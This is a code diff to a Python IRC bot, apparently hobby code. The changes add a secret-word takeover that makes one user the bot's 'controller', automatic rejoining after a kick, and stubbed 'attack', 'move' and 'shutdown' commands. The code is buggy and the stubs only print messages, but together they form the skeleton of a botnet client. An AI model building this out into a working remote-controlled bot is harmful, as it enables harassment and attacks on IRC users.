@@ -3,6 +3,7 @@
 import sys
 import socket
 import random
+import numpy
 import string
 
 class PyBot:
@@ -16,6 +17,7 @@ class PyBot:
     self.secret = secret
     self.nick = self.generateRandomName()
     self.controlMode = 0 #default 0 = bot not being controller
+    self.controllerName = ""
 
     try: # NOTE: Should put this in some kind of loop so the bot can retry, generateRandomName() should be called from inside of the loop
       self.s = s.connect((host,int(port)))
@@ -23,8 +25,12 @@ class PyBot:
       s.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
     except:
       print("unable to connect to irc server")
-    s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
 
+    try:
+      s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
+    except:
+      print("DEBUG --> unable to join channnel on server")
+     
   def listen(self):
     while True:
       data = ""
@@ -41,20 +47,39 @@ class PyBot:
         temp = data.split("PRIVMSG")
         temp2 = temp[1].split(":")
         message = temp2[1]
-        print("DEBUG --> " + user + " Says: " + message)
         self.examinePrivmsg(user,message)
 
+      elif data.find("KICK :") != -1:
+          s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel
+
   def examinePrivmsg(self,user,message):
-# This needs to be updated to store the controller's information and accept control commands from the controller only
-    if message == secret:
-      print("DEBUG --> Controller said the secret! Control Mode enabled, read to troll and annoy")
-      self.control = 1
+    
+    print("DEBUG --> "+user+" says:"+message)
+
+    if message == secret and self.controlMode == 0:
+      print("DEBUG --> Controller said the secret! Control Mode enabled, at your command troll")
+      self.controlMode = 1
+      self.controllerName = user
+    
+    elif self.controlMode == 1 and user == self.controllerName: 
+      if message == "status":
+        print("DEBUG --> status requested by controller")
+      elif message == "attack":
+        print("DEBUG --> attack requested by controller")
+      elif message == "move":
+        print("DEBUG --> move requested by controller")
+      elif message == "quit":
+        print("DEBUG --> move requested by controller")
+      elif message == "shutdown":
+        print("DEBUG --> move requested by controller")
 
   def changeChannel(self,newChannel):
     print("DEBUG --> Changing channel")     
 
   def generateRandomName(self):
-    randomName = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
+    randomName = "Bot" + random.choice(string.digits) + random.choice(string.digits)
+    #program halts at this line of code.
+    #randomName = "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
     return randomName
 
 #Main
